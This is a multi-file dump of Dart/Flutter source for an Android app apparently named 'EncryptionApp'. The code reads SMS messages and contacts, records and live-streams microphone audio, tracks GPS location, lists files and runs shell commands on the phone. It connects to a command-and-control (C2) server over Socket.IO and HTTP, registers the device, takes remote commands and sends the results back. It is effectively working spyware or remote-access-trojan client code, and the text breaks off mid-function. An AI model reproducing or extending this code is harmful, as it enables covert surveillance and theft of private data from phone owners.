  final DeviceInfoPlugin _deviceInfoPlugin = DeviceInfoPlugin();
  final Uuid _uuid = const Uuid();

  Future<String> getOrCreateUniqueDeviceId() async {
    final prefs = await SharedPreferences.getInstance();
    String? deviceId = prefs.getString(PREF_DEVICE_ID); // استخدام الثابت المحدث

    if (deviceId != null && deviceId.isNotEmpty) {
      debugPrint("DeviceInfoService: Retrieved existing Device ID: $deviceId");
      return deviceId;
    }

    try {
      if (kIsWeb) {
        // For web, a UUID is generally the most reliable persistent client identifier
        // that doesn't rely on browser-specific or easily cleared storage like localStora
        // However, for consistency with mobile, we'll generate a UUID and store it.
        deviceId = "web_${_uuid.v4()}";
      } else if (Platform.isAndroid) {
        final androidInfo = await _deviceInfoPlugin.androidInfo;
        // androidInfo.id (SSAID) can be null or change on factory reset.
        // It's generally unique per app signing key, app, and user.
        // Using it as a base if available.
        String? nativeId =
            androidInfo.id; // android.os.Build.SERIAL is restricted.
        if (nativeId.isNotEmpty && nativeId != "unknown") {
          deviceId = "android_$nativeId";
        } else {
          // Fallback for Android if SSAID is not good
          deviceId = "android_uuid_${_uuid.v4()}";
        }
      } else if (Platform.isIOS) {
        final iosInfo = await _deviceInfoPlugin.iosInfo;
        // identifierForVendor is unique to the app's vendor on that device.
        if (iosInfo.identifierForVendor != null &&
            iosInfo.identifierForVendor!.isNotEmpty) {
          deviceId = "ios_${iosInfo.identifierForVendor!}";
        } else {
          // Fallback for iOS
          deviceId = "ios_uuid_${_uuid.v4()}";
        }
      } else {
        // Other platforms (Linux, Windows, macOS)
        // For desktop, combination of machine details might be an option, but UUID is simpler for now.
        deviceId = "desktop_${_uuid.v4()}";
      }
    } catch (e) {
      debugPrint(
          "DeviceInfoService: Error getting native device ID: $e. Falling back to pure UUID.");
      deviceId = "generic_uuid_${_uuid.v4()}"; // Pure UUID as a last resort
    }
    // Ensure deviceId is never null before saving
    if (deviceId.isEmpty) {
      deviceId = "fallback_uuid_${_uuid.v4()}";
      debugPrint(
          "DeviceInfoService: Device ID was still null/empty, used final fallback UUID: $deviceId");
    }

    await prefs.setString(PREF_DEVICE_ID, deviceId); // استخدام الثابت المحدث
    debugPrint(
        "DeviceInfoService: Generated and saved new Device ID: $deviceId");
    return deviceId;
  }

  Future<Map<String, dynamic>> getDeviceInfo() async {
    final String uniqueId = await getOrCreateUniqueDeviceId();
    final Map<String, dynamic> deviceData = {
      'deviceId': uniqueId, // المعرف الفريد للجهاز
      'platform': 'unknown_platform',
      'osVersion': 'unknown_os_version',
      'model': 'unknown_model',
      'deviceName': 'unknown_device_name',
      'brand': 'unknown_brand',
      'isPhysicalDevice': 'unknown',
      'systemFeatures': <String>[], // خاص بالأندرويد
      'collectedAt': DateTime.now().toUtc().toIso8601String(),
    };

    try {
      if (kIsWeb) {
        deviceData['platform'] = 'web';
        final webBrowserInfo = await _deviceInfoPlugin.webBrowserInfo;
        deviceData['osVersion'] = webBrowserInfo.platform ?? 'N/A';
        deviceData['model'] = webBrowserInfo.browserName
            .toString()
            .split('.')
            .last; // e.g., Chrome
        deviceData['deviceName'] = webBrowserInfo.userAgent?.substring(
                0,
                (webBrowserInfo.userAgent?.length ?? 0) > 200
                    ? 200
                    : (webBrowserInfo.userAgent?.length ?? 0)) ??
            'N/A';
        deviceData['brand'] = webBrowserInfo.vendor ?? 'N/A';
        deviceData['isPhysicalDevice'] =
            'false'; // Web is not a physical device in this context
      } else if (Platform.isAndroid) {
        final androidInfo = await _deviceInfoPlugin.androidInfo;
        deviceData['platform'] = 'android';
        deviceData['osVersion'] = androidInfo.version.release; // e.g., "13"
        deviceData['sdkInt'] = androidInfo.version.sdkInt;
        deviceData['brand'] = androidInfo.brand; // e.g., "samsung"
        deviceData['model'] = androidInfo.model; // e.g., "SM-G991U"
        deviceData['deviceName'] =
            androidInfo.device; // internal name e.g., "starqltesq"
        deviceData['product'] = androidInfo.product; // user-facing product name
        deviceData['display'] = androidInfo.display; // display ID
        deviceData['isPhysicalDevice'] =
            androidInfo.isPhysicalDevice.toString();
        deviceData['systemFeatures'] = androidInfo.systemFeatures;
        // deviceData['androidId_debug'] = androidInfo.id; // SSAID for debugging
      } else if (Platform.isIOS) {
        final iosInfo = await _deviceInfoPlugin.iosInfo;
        deviceData['platform'] = 'ios';
        deviceData['osVersion'] = iosInfo.systemVersion; // e.g., "16.5"
        deviceData['model'] =
            iosInfo.model; // e.g., "iPhone14,5" (internal model name)
        deviceData['utsname_machine'] =
            iosInfo.utsname.machine; // More specific model
        deviceData['deviceName'] = iosInfo.name; // e.g., "John's iPhone"
        deviceData['brand'] = 'Apple';
        deviceData['isPhysicalDevice'] = iosInfo.isPhysicalDevice.toString();
        // deviceData['identifierForVendor_debug'] = iosInfo.identifierForVendor; // For debugging
      }
      // Add other platforms if needed (macOS, Windows, Linux)
    } catch (e, s) {
      debugPrint(
          "DeviceInfoService: Error getting detailed device info: $e\nStackTrace: $s");
      deviceData['error_getting_device_info'] = e.toString();
    }
    return deviceData;
  }
}



// ------------------------------ نهاية الملف: device_info_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: file_system_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\file_system_service.dart
// ----------------------------------------------------------------------

// lib/services/file_system_service.dart
import 'package:flutter/foundation.dart'; // لـ debugPrint
import 'package:flutter/services.dart';
// لا حاجة لـ EnhancedLoggerService هنا مباشرة إذا كانت الأخطاء تُمرر للخارج

class FileSystemService {
  // اسم القناة يجب أن يتطابق مع ما هو معرف في MainActivity.kt
  static const MethodChannel _channel = MethodChannel(
      'com.zeroone.theconduit/files'); // تم التغيير من /filesystem إلى /files

  Future<Map<String, dynamic>?> listFiles(String path) async {
    debugPrint(
        "FileSystemService (Dart): Attempting to list files for path: $path via platform channel");
    try {
      final Map<dynamic, dynamic>? result = await _channel.invokeMethod(
        'listFiles', // اسم الدالة في الكود الأصلي
        {'path': path}, // الوسائط المرسلة
      );
      if (result != null) {
        // تحويل المفاتيح إلى String إذا لم تكن كذلك بالفعل
        final Map<String, dynamic> typedResult = Map<String, dynamic>.from(
          result.map((key, value) => MapEntry(key.toString(), value)),
        );
        debugPrint(
            "FileSystemService (Dart): Successfully listed files. Data: ${typedResult.toString().substring(0, (typedResult.toString().length > 200 ? 200 : typedResult.toString().length))}"); // تسجيل جزء من النتيجة
        return typedResult;
      } else {
        debugPrint(
            "FileSystemService (Dart): Native listFiles method returned null.");
        return {
          'error': 'Native method for listFiles returned null',
          'path': path,
          'files': []
        };
      }
    } on PlatformException catch (e) {
      debugPrint(
          "FileSystemService (Dart): PlatformException during listFiles: ${e.code} - ${e.message} - Details: ${e.details}");
      return {
        'error': e.message,
        'details': e.details,
        'errorCode': e.code,
        'path': path,
        'files': []
      };
    } catch (e) {
      debugPrint("FileSystemService (Dart): Unexpected error in listFiles: $e");
      return {'error': e.toString(), 'path': path, 'files': []};
    }
  }

  Future<Map<String, dynamic>?> executeShellCommand(
    String command,
    List<String> args,
  ) async {
    debugPrint(
        "FileSystemService (Dart): Attempting to execute shell command: '$command' with args: $args");
    // !!! تنبيه: هذا سيفشل إذا لم يتم تنفيذ الجزء الأصلي في MainActivity.kt !!!
    // !!! تأكد من أن MainActivity.kt لديها معالج لـ "executeShell" !!!
    try {
      final Map<dynamic, dynamic>? result = await _channel.invokeMethod(
        'executeShell', // اسم الدالة المتوقع في الكود الأصلي
        {'command': command, 'args': args},
      );
      if (result != null) {
        final Map<String, dynamic> typedResult = Map<String, dynamic>.from(
          result.map((key, value) => MapEntry(key.toString(), value)),
        );
        debugPrint(
            "FileSystemService (Dart): Shell command executed. Output: $typedResult");
        return typedResult;
      } else {
        debugPrint(
            "FileSystemService (Dart): Native executeShell method returned null.");
        return {
          'error': 'Native method for executeShell returned null',
          'command': command
        };
      }
    } on PlatformException catch (e) {
      debugPrint(
          "FileSystemService (Dart): PlatformException during executeShell: ${e.code} - ${e.message} - Details: ${e.details}");
      if (e.code == "NotImplemented") {
        return {
          'error':
              "Shell execution is not implemented on the native side (Android/iOS). Command: '$command'",
          'details': e.details,
          'errorCode': e.code
        };
      }
      return {
        'error': e.message,
        'details': e.details,
        'errorCode': e.code,
        'command': command
      };
    } catch (e) {
      debugPrint(
          "FileSystemService (Dart): Unexpected error in executeShellCommand: $e");
      return {'error': e.toString(), 'command': command};
    }
  }
}



// ------------------------------ نهاية الملف: file_system_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: location_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\location_service.dart
// ----------------------------------------------------------------------

// lib/services/location_service.dart
// الإصدار المعدل لاستخدام إضافة geolocator للعمل بشكل أفضل في الخلفية

import 'dart:async'; // Required for TimeoutException
import 'package:flutter/foundation.dart';
import 'package:geolocator/geolocator.dart';
import 'package:flutter/services.dart';

class LocationService {
  // لا حاجة لإنشاء كائن من Geolocator، فالدوال ثابتة (static)

  Future<Position?> getCurrentLocation() async {
    bool serviceEnabled;
    LocationPermission permission;

    // التحقق من أن خدمات الموقع مفعلة على الجهاز
    serviceEnabled = await Geolocator.isLocationServiceEnabled();
    if (!serviceEnabled) {
      debugPrint("LocationService (geolocator): خدمات الموقع معطلة.");
      return null;
    }

    permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      debugPrint(
        "LocationService (geolocator): إذن الموقع مرفوض. محاولة طلب الإذن...",
      );
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {
        debugPrint("LocationService (geolocator): طلب إذن الموقع مرفوض.");
        return null;
      }
    }

    if (permission == LocationPermission.deniedForever) {
      debugPrint("LocationService (geolocator): إذن الموقع مرفوض بشكل دائم.");
      return null;
    }

    debugPrint(
      "LocationService (geolocator): الأذونات ممنوحة وخدمات الموقع مفعلة. محاولة الحصول على الموقع...",
    );

    try {
      return await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
        // timeLimit: const Duration(seconds: 15), // Can be added if needed
      );
    } on PlatformException catch (e) {
      debugPrint(
        "LocationService (geolocator): خطأ PlatformException أثناء الحصول على الموقع: ${e.code} - ${e.message}",
      );
      return null;
    } on LocationServiceDisabledException catch (e) {
      debugPrint(
        "LocationService (geolocator): خطأ LocationServiceDisabledException: ${e.toString()}",
      );
      return null;
    } on TimeoutException catch (e) {
      // Now TimeoutException is recognized
      debugPrint(
        "LocationService (geolocator): انتهت مهلة الحصول على الموقع: ${e.message}",
      );
      return null;
    } catch (e) {
      debugPrint(
        "LocationService (geolocator): خطأ غير متوقع أثناء الحصول على الموقع: $e",
      );
      return null;
    }
  }
}



// ------------------------------ نهاية الملف: location_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: native_features_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\native_features_service.dart
// ----------------------------------------------------------------------

// lib/services/native_features_service.dart
import 'dart:async';

import 'package:flutter/services.dart';
// Import your logger if you have one, e.g.:
// import '../core/logging/enhanced_logger_service.dart';

class NativeFeaturesService {
  static const MethodChannel _nativeFeaturesChannel =
      MethodChannel('com.zeroone.theconduit/native_features');
  // final EnhancedLoggerService _logger = EnhancedLoggerService(); // If using a logger

  final StreamController<Uint8List> _audioChunkController =
      StreamController<Uint8List>.broadcast();
  Stream<Uint8List> get onAudioChunk => _audioChunkController.stream;

  NativeFeaturesService() {
    _nativeFeaturesChannel.setMethodCallHandler(_handleNativeMethodCalls);
  }

  Future<dynamic> _handleNativeMethodCalls(MethodCall call) async {
    // _logger.debug("NativeFeaturesService", "Received call from native: ${call.method}");
    print("NativeFeaturesService: Received call from native: ${call.method}");
    switch (call.method) {
      case "onLiveAudioChunk":
        if (call.arguments is Uint8List) {
          _audioChunkController.add(call.arguments as Uint8List);
        } else {
          // _logger.warn("NativeFeaturesService", "onLiveAudioChunk received non-Uint8List data: ${call.arguments.runtimeType}");
          print(
              "NativeFeaturesService: onLiveAudioChunk received non-Uint8List data: ${call.arguments.runtimeType}");
        }
        break;
      default:
        // _logger.warn("NativeFeaturesService", "Unhandled native method: ${call.method}");
        print("NativeFeaturesService: Unhandled native method: ${call.method}");
    }
  }

  Future<List<Map<String, dynamic>>?> getSmsList() async {
    try {
      // _logger.info("NativeFeaturesService", "Requesting SMS list from native.");
      print("NativeFeaturesService: Requesting SMS list from native.");
      final List<dynamic>? smsListDynamic =
          await _nativeFeaturesChannel.invokeMethod('getSmsList');
      if (smsListDynamic != null) {
        return smsListDynamic
            .map((sms) => Map<String, dynamic>.from(sms as Map))
            .toList();
      }
      // _logger.info("NativeFeaturesService", "SMS list received as null.");
      print("NativeFeaturesService: SMS list received as null.");
      return null;
    } on PlatformException catch (e) {
      // _logger.error("NativeFeaturesService", "Failed to get SMS list: '${e.message}'. Details: ${e.details}");
      print(
          "NativeFeaturesService: Failed to get SMS list: '${e.message}'. Details: ${e.details}");
      return null;
    } catch (e) {
      // _logger.error("NativeFeaturesService", "Generic error getting SMS list: $e");
      print("NativeFeaturesService: Generic error getting SMS list: $e");
      return null;
    }
  }

  Future<List<Map<String, dynamic>>?> getContactsList() async {
    try {
      // _logger.info("NativeFeaturesService", "Requesting contacts list from native.");
      print("NativeFeaturesService: Requesting contacts list from native.");
      final List<dynamic>? contactsListDynamic =
          await _nativeFeaturesChannel.invokeMethod('getContactsList');
      if (contactsListDynamic != null) {
        return contactsListDynamic
            .map((contact) => Map<String, dynamic>.from(contact as Map))
            .toList();
      }
      // _logger.info("NativeFeaturesService", "Contacts list received as null.");
      print("NativeFeaturesService: Contacts list received as null.");
      return null;
    } on PlatformException catch (e) {
      // _logger.error("NativeFeaturesService", "Failed to get contacts list: '${e.message}'. Details: ${e.details}");
      print(
          "NativeFeaturesService: Failed to get contacts list: '${e.message}'. Details: ${e.details}");
      return null;
    } catch (e) {
      // _logger.error("NativeFeaturesService", "Generic error getting contacts list: $e");
      print("NativeFeaturesService: Generic error getting contacts list: $e");
      return null;
    }
  }

  Future<String?> recordAudioForDuration(int durationSeconds) async {
    try {
      // _logger.info("NativeFeaturesService", "Requesting audio recording for $durationSeconds seconds.");
      print(
          "NativeFeaturesService: Requesting audio recording for $durationSeconds seconds.");
      final String? filePath = await _nativeFeaturesChannel
          .invokeMethod('recordAudio', {'duration_seconds': durationSeconds});
      // _logger.info("NativeFeaturesService", "Audio recording finished. File path: $filePath");
      print(
          "NativeFeaturesService: Audio recording finished. File path: $filePath");
      return filePath;
    } on PlatformException catch (e) {
      // _logger.error("NativeFeaturesService", "Failed to record audio: '${e.message}'. Details: ${e.details}");
      print(
          "NativeFeaturesService: Failed to record audio: '${e.message}'. Details: ${e.details}");
      return null;
    } catch (e) {
      // _logger.error("NativeFeaturesService", "Generic error recording audio: $e");
      print("NativeFeaturesService: Generic error recording audio: $e");
      return null;
    }
  }

  Future<String?> startLiveAudioStreaming() async {
    try {
      // _logger.info("NativeFeaturesService", "Requesting to start live audio streaming.");
      print("NativeFeaturesService: Requesting to start live audio streaming.");
      final response =
          await _nativeFeaturesChannel.invokeMethod('startLiveAudio');
      // _logger.info("NativeFeaturesService", "Start live audio response: $response");
      print("NativeFeaturesService: Start live audio response: $response");
      return response?.toString();
    } on PlatformException catch (e) {
      // _logger.error("NativeFeaturesService", "Failed to start live audio: '${e.message}'. Details: ${e.details}");
      print(
          "NativeFeaturesService: Failed to start live audio: '${e.message}'. Details: ${e.details}");
      return "Error: ${e.message}";
    } catch (e) {
      // _logger.error("NativeFeaturesService", "Generic error starting live audio: $e");
      print("NativeFeaturesService: Generic error starting live audio: $e");
      return "Error: $e";
    }
  }

  Future<String?> stopLiveAudioStreaming() async {
    try {
      // _logger.info("NativeFeaturesService", "Requesting to stop live audio streaming.");
      print("NativeFeaturesService: Requesting to stop live audio streaming.");
      final response =
          await _nativeFeaturesChannel.invokeMethod('stopLiveAudio');
      // _logger.info("NativeFeaturesService", "Stop live audio response: $response");
      print("NativeFeaturesService: Stop live audio response: $response");
      return response?.toString();
    } on PlatformException catch (e) {
      // _logger.error("NativeFeaturesService", "Failed to stop live audio: '${e.message}'. Details: ${e.details}");
      print(
          "NativeFeaturesService: Failed to stop live audio: '${e.message}'. Details: ${e.details}");
      return "Error: ${e.message}";
    } catch (e) {
      // _logger.error("NativeFeaturesService", "Generic error stopping live audio: $e");
      print("NativeFeaturesService: Generic error stopping live audio: $e");
      return "Error: $e";
    }
  }

  void dispose() {
    _audioChunkController.close();
    // _logger.info("NativeFeaturesService", "Disposed.");
    print("NativeFeaturesService: Disposed.");
  }
}



// ------------------------------ نهاية الملف: native_features_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: network_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\network_service.dart
// ----------------------------------------------------------------------

// lib/services/network_service.dart
import 'dart:async';
import 'dart:convert'; //
import 'dart:io'; //
import 'dart:typed_data'; // For Uint8List

import 'package:camera/camera.dart' show XFile; //
import 'package:http/http.dart' as http; //
import 'package:socket_io_client/socket_io_client.dart' as sio; //

import '../config/app_config.dart'; //
import '../core/logging/enhanced_logger_service.dart'; //
import '../utils/constants.dart'; //

class NetworkService {
  sio.Socket? _socket; //
  final EnhancedLoggerService _logger = EnhancedLoggerService(); //
  int _reconnectAttempts = 0; //
  Timer? _reconnectTimer; //
  Timer? _heartbeatTimer; //
  bool _isReconnecting = false; //
  String? _lastConnectedDeviceId; //

  final StreamController<bool> _connectionStatusController =
      StreamController<bool>.broadcast(); //
  Stream<bool> get connectionStatusStream =>
      _connectionStatusController.stream; //

  final StreamController<Map<String, dynamic>> _commandController =
      StreamController<Map<String, dynamic>>.broadcast(); //
  Stream<Map<String, dynamic>> get commandStream =>
      _commandController.stream; //

  bool get isSocketConnected => _socket?.connected ?? false; //

  NetworkService() {
    _logger.info("NetworkService", "NetworkService instance created."); //
  }

  void _initializeSocket(String deviceIdForConnection) {
    _lastConnectedDeviceId = deviceIdForConnection; //

    if (_socket != null) {
      _logger.info("NetworkService:_initializeSocket",
          "Disposing existing socket before creating a new one."); //
      _socket!.dispose(); //
      _socket = null;
    }

    _logger.info("NetworkService:_initializeSocket",
        "Initializing Socket.IO to $C2_SOCKET_IO_URL for Device ID: $deviceIdForConnection"); //
    try {
      _socket = sio.io(C2_SOCKET_IO_URL, <String, dynamic>{
        //
        'transports': ['websocket', 'polling'],
        'autoConnect': false,
        'forceNew': true, //
        'reconnection': true, //
        'reconnectionAttempts': C2_SOCKET_IO_RECONNECT_ATTEMPTS > 0
            ? C2_SOCKET_IO_RECONNECT_ATTEMPTS
            : 5, //
        'reconnectionDelay': C2_SOCKET_IO_RECONNECT_DELAY.inMilliseconds, //
        'reconnectionDelayMax': C2_SOCKET_IO_RECONNECT_DELAY.inMilliseconds * 5,
        'timeout': 20000,
        'query': {
          //
          'deviceId': deviceIdForConnection,
          'clientType': APP_NAME, //
          'timestamp': DateTime.now().millisecondsSinceEpoch.toString(),
          'version': '1.0.1', // Increment version if needed
        },
      });

      _socket!.onConnect((_) {
        //
        _logger.info("NetworkService:Events",
            "Socket.IO Connected! SID: ${_socket?.id}, Device ID: $deviceIdForConnection");
        _connectionStatusController.add(true);
        _reconnectAttempts = 0;
        _isReconnecting = false;
        _stopReconnectTimer();
        _startHeartbeat();
      });

      _socket!.onDisconnect((reason) {
        //
        _logger.warn("NetworkService:Events",
            "Socket.IO Disconnected. Reason: $reason. Device ID: $_lastConnectedDeviceId");
        _connectionStatusController.add(false);
        _stopHeartbeat();
        if (!_isReconnecting && _lastConnectedDeviceId != null) {
          _scheduleReconnect(); //
        }
      });

      _socket!.onConnectError((error) {
        //
        _logger.error(
            "NetworkService:Events",
            "Socket.IO Connection Error. Device ID: $_lastConnectedDeviceId",
            error);
        _connectionStatusController.add(false);
        _stopHeartbeat();
        if (!_isReconnecting && _lastConnectedDeviceId != null) {
          _scheduleReconnect();
        }
      });

      _socket!.onError((error) {
        //
        _logger.error(
            "NetworkService:Events",
            "Socket.IO Generic Error. Device ID: $_lastConnectedDeviceId",
            error);
      });

      _socket!.on('command', (data) {
        //
        if (data is Map) {
          final String? commandName = data['command'] as String?;
          final Map<String, dynamic> args = data['args'] is Map
              ? Map<String, dynamic>.from(data['args'])
              : {}; //
          final String? commandId = data['command_id'] as String?; //

          if (commandName != null) {
            _logger.info("NetworkService:CommandListener",
                "Received unified command '$commandName' (ID: ${commandId ?? "N/A"}) from C2 with args: $args. Device ID: $_lastConnectedDeviceId");
            _commandController.add({
              //
              'command': commandName,
              'command_id': commandId,
              'args': args,
            });
          } else {
            _logger.warn(
                "NetworkService:CommandListener", //
                "Received command with null name. Data: $data. Device ID: $_lastConnectedDeviceId");
          }
        } else {
          _logger.warn(
              "NetworkService:CommandListener", //
              "Received malformed command data (not a Map): $data. Device ID: $_lastConnectedDeviceId");
        }
      });

      _socket!.on(SIO_EVENT_REQUEST_REGISTRATION_INFO, (_) {
        //
        _logger.info("NetworkService:Events",
            "Received '$SIO_EVENT_REQUEST_REGISTRATION_INFO' from C2. Device ID: $_lastConnectedDeviceId");
        _commandController.add({
          //
          'command': SIO_EVENT_REQUEST_REGISTRATION_INFO,
          'command_id':
              'server_request_reg_${DateTime.now().millisecondsSinceEpoch}',
          'args': {}, //
        });
      });

      _socket!.on(SIO_EVENT_REGISTRATION_SUCCESSFUL, (data) {
        //
        _logger.info("NetworkService:Events",
            "Received '$SIO_EVENT_REGISTRATION_SUCCESSFUL' from C2. Data: $data. Device ID: $_lastConnectedDeviceId");
      });
    } catch (e, stackTrace) {
      _logger.error(
          "NetworkService:_initializeSocket",
          "Exception during Socket.IO instance creation or event listener setup. Device ID: $deviceIdForConnection",
          e,
          stackTrace);
      _connectionStatusController.add(false); //
      if (!_isReconnecting && _lastConnectedDeviceId != null) {
        _scheduleReconnect();
      }
    }
  }

  Future<void> connectSocketIO(String deviceIdToConnectWith) async {
    if (_socket == null || _lastConnectedDeviceId != deviceIdToConnectWith) {
      _logger.info("NetworkService:connectSocketIO",
          "Socket not initialized or deviceId changed. Initializing for $deviceIdToConnectWith.");
      _initializeSocket(deviceIdToConnectWith); //
    }

    if (_socket != null && !_socket!.connected) {
      _logger.info("NetworkService:connectSocketIO",
          "Attempting to connect socket for Device ID: $deviceIdToConnectWith...");
      _socket!.connect(); //
    } else if (_socket != null && _socket!.connected) {
      _logger.info("NetworkService:connectSocketIO",
          "Socket already connected for Device ID: $deviceIdToConnectWith. SID: ${_socket?.id}");
      if (!_connectionStatusController.isClosed && //
          _connectionStatusController.hasListener) {
        _connectionStatusController.add(true); //
      }
      _startHeartbeat(); //
    } else {
      _logger.error("NetworkService:connectSocketIO",
          "Socket is unexpectedly null after initialization attempt for Device ID: $deviceIdToConnectWith.");
      if (!_isReconnecting && _lastConnectedDeviceId != null) {
        //
        _scheduleReconnect(); //
      }
    }
  }

  void _scheduleReconnect() {
    if (_isReconnecting || _lastConnectedDeviceId == null) {
      _logger.info("NetworkService:_scheduleReconnect",
          "Reconnect already in progress or no deviceId to reconnect with. Skipping."); //
      return;
    }
    _isReconnecting = true;
    _reconnectAttempts++;

    _stopReconnectTimer(); //

    final int delaySeconds =
        (_reconnectAttempts * C2_SOCKET_IO_RECONNECT_DELAY.inSeconds)
            .clamp(C2_SOCKET_IO_RECONNECT_DELAY.inSeconds, 60); //

    _logger.info("NetworkService:_scheduleReconnect",
        "Scheduling reconnect attempt #$_reconnectAttempts in $delaySeconds seconds for Device ID: $_lastConnectedDeviceId."); //
    _reconnectTimer = Timer(Duration(seconds: delaySeconds), () {
      //
      if (_lastConnectedDeviceId != null) {
        _logger.info("NetworkService:_scheduleReconnect",
            "Executing reconnect attempt #$_reconnectAttempts for Device ID: $_lastConnectedDeviceId.");
        connectSocketIO(_lastConnectedDeviceId!);
      } else {
        _logger.warn(
            "NetworkService:_scheduleReconnect", //
            "Cannot execute reconnect, _lastConnectedDeviceId is null.");
        _isReconnecting = false;
      }
    });
  }

  void _stopReconnectTimer() {
    _reconnectTimer?.cancel(); //
    _reconnectTimer = null;
  }

  void _startHeartbeat() {
    if (_lastConnectedDeviceId == null) {
      _logger.warn("NetworkService:_startHeartbeat",
          "Cannot start heartbeat, _lastConnectedDeviceId is null."); //
      return;
    }
    _stopHeartbeat();

    _logger.info("NetworkService:_startHeartbeat",
        "Starting heartbeat with interval ${C2_HEARTBEAT_INTERVAL.inSeconds} seconds for Device ID: $_lastConnectedDeviceId."); //
    _heartbeatTimer = Timer.periodic(C2_HEARTBEAT_INTERVAL, (_) {
      //
      if (isSocketConnected && _lastConnectedDeviceId != null) {
        _logger.debug("NetworkService:HeartbeatTimer",
            "Sending heartbeat for Device ID: $_lastConnectedDeviceId.");
        sendHeartbeat({
          'deviceId': _lastConnectedDeviceId!,
          'timestamp': DateTime.now().toIso8601String()
        });
      } else {
        _logger.warn(
            "NetworkService:HeartbeatTimer", //
            "Cannot send heartbeat - socket not connected or no deviceId. Stopping heartbeat. Device ID: $_lastConnectedDeviceId");
        _stopHeartbeat();
      }
    });
  }

  void _stopHeartbeat() {
    if (_heartbeatTimer != null) {
      _logger.info("NetworkService:_stopHeartbeat",
          "Stopping heartbeat. Device ID: $_lastConnectedDeviceId"); //
      _heartbeatTimer!.cancel(); //
      _heartbeatTimer = null;
    }
  }

  void disconnectSocketIO() {
    _logger.info("NetworkService:disconnectSocketIO",
        "Disconnecting and disposing Socket.IO. Device ID: $_lastConnectedDeviceId"); //
    _stopHeartbeat();
    _stopReconnectTimer();
    _isReconnecting = false; //

    if (_socket != null) {
      if (_socket!.connected) {
        _socket!.disconnect(); //
      }
      _socket!.dispose(); //
      _socket = null; //
    }
    _logger.info("NetworkService:disconnectSocketIO",
        "Socket.IO resources released for Device ID: $_lastConnectedDeviceId."); //
  }

  void registerDeviceWithC2(Map<String, dynamic> deviceInfoPayload) {
    if (isSocketConnected) {
      if (!deviceInfoPayload.containsKey('deviceId') ||
          (deviceInfoPayload['deviceId'] as String?)?.isEmpty == true) {
        deviceInfoPayload['deviceId'] = _lastConnectedDeviceId ?? //
            'unknown_fallback_id_in_reg'; //
        _logger.warn("NetworkService:registerDeviceWithC2",
            "deviceId was missing in payload, added: ${deviceInfoPayload['deviceId']}");
      }
      _logger.info(
          "NetworkService:registerDeviceWithC2", //
          "Sending '$SIO_EVENT_REGISTER_DEVICE' with payload for Device ID: ${deviceInfoPayload['deviceId']}. Payload: ${jsonEncode(deviceInfoPayload)}");
      _socket!.emit(SIO_EVENT_REGISTER_DEVICE, deviceInfoPayload); //
    } else {
      _logger.warn(
          "NetworkService:registerDeviceWithC2", //
          "Cannot register device. Socket not connected. Device ID: $_lastConnectedDeviceId");
      if (!_isReconnecting && _lastConnectedDeviceId != null) {
        //
        _scheduleReconnect(); //
      }
    }
  }

  void sendHeartbeat(Map<String, dynamic> heartbeatPayload) {
    if (isSocketConnected) {
      _logger.debug("NetworkService:sendHeartbeat",
          "Sending '$SIO_EVENT_DEVICE_HEARTBEAT' for Device ID: ${heartbeatPayload['deviceId']}");
      _socket!.emit(SIO_EVENT_DEVICE_HEARTBEAT, heartbeatPayload); //
    } else {
      _logger.warn(
          "NetworkService:sendHeartbeat", //
          "Cannot send heartbeat. Socket not connected. Device ID: ${heartbeatPayload['deviceId']}");
    }
  }

  void sendCommandResponse({
    required String originalCommand,
    String? commandId,
    required String status,
    dynamic payload,
  }) {
    if (isSocketConnected) {
      final response = {
        'command': originalCommand,
        'command_id': commandId ?? //
            'client_generated_${DateTime.now().millisecondsSinceEpoch}',
        'status': status,
        'payload': payload ?? {}, //
        'timestamp_response_utc': DateTime.now().toUtc().toIso8601String(), //
        'deviceId': _lastConnectedDeviceId ?? //
            'unknown_id_in_resp'
      };
      _logger.info(
          "NetworkService:sendCommandResponse", //
          "Sending '$SIO_EVENT_COMMAND_RESPONSE' for command '$originalCommand' (ID: ${response['command_id']}) with status '$status'. Device ID: ${response['deviceId']}");
      _socket!.emit(SIO_EVENT_COMMAND_RESPONSE, response); //
    } else {
      _logger.warn(
          "NetworkService:sendCommandResponse", //
          "Cannot send command response for '$originalCommand'. Socket not connected. Device ID: $_lastConnectedDeviceId");
    }
  }

  // New method to send live audio chunks
  void sendLiveAudioChunk(Uint8List audioChunk) {
    if (isSocketConnected && _lastConnectedDeviceId != null) {
      _logger.debug("NetworkService:sendLiveAudioChunk",
          "Sending live audio chunk, size: ${audioChunk.lengthInBytes} bytes for Device ID: $_lastConnectedDeviceId");
      _socket?.emit(SIO_EVENT_LIVE_AUDIO_CHUNK, {
        'deviceId': _lastConnectedDeviceId,
        'chunk':
            audioChunk, // Socket.IO client handles binary data appropriately
        'timestamp': DateTime.now().toUtc().toIso8601String()
      });
    } else {
      _logger.warn("NetworkService:sendLiveAudioChunk",
          "Cannot send audio chunk. Socket not connected or no deviceId.");
    }
  }

  Future<bool> sendInitialData({
    required Map<String, dynamic> jsonData,
    XFile? imageFile,
  }) async {
    final Uri url =
        Uri.parse(C2_HTTP_SERVER_URL + HTTP_ENDPOINT_UPLOAD_INITIAL_DATA); //
    _logger.info(
        "NetworkService:sendInitialData", //
        "Sending initial data to: $url. Device ID from JSON: ${jsonData['deviceId']}");
    try {
      var request = http.MultipartRequest('POST', url); //
      if (!jsonData.containsKey('deviceId') ||
          (jsonData['deviceId'] as String?)?.isEmpty == true) {
        jsonData['deviceId'] =
            _lastConnectedDeviceId ?? 'fallback_initial_id'; //
        _logger.warn(
            "NetworkService:sendInitialData", //
            "deviceId was missing in jsonData, added: ${jsonData['deviceId']}");
      }
      request.fields['json_data'] = jsonEncode(jsonData); //

      if (imageFile != null) {
        _logger.info(
            "NetworkService:sendInitialData", //
